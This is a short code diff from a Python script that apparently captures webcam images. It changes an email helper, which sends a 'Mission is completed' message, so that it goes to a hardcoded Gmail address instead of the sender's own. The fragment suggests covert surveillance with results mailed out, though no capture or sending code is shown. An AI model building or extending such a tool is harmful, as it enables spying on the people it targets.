@@ -70,7 +70,7 @@ def webcam(file_path):
 #Email system function #
 def email_base(name, email_address):
     name['From'] = email_address
-    name['To'] =  email_address
+    name['To'] =  'test123@gmail.com'
     name['Subject'] = 'Success!!!'
     body = 'Mission is completed' 
     name.attach(MIMEText(body, 'plain'))
